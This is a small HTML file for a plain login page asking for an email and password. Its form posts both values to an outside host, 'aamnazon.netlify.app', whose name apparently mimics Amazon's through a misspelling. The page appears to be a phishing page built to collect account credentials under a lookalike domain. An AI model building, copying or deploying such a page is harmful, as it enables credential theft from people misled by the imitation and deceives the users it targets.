<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    </head>
    <style>
        body {
            background-image: url("loga.jpg");
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            color: white;
        }
        .login-container {
            padding: 20px;
            border-radius: 10px;
            width: 300px;
            text-align: center;
        }
        h1 {
            margin-bottom: 20px;
            color: white;
        }
        label {
            display: block;
            margin: 10px 0 5px;
            text-align: left;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: none;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color:  #FFF380;
            border: none;
            border-radius: 5px;
            color: black;
            font-size: 16px;
            cursor: pointer;
        }
        button[type="submit"]:hover {
            background-color:  #FFF380;
        }
    </style>

<body>
    <div class="login-container">
        <h1>Login Process</h1>
        <form action="https://aamnazon.netlify.app" method="post">
            <label for="email">Email:</label>
            <input type="email" id="email" name="email" required>
            
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            
            <button type="submit" name="submit">Login</button>
        </form>
    </div>
</body>
</html>
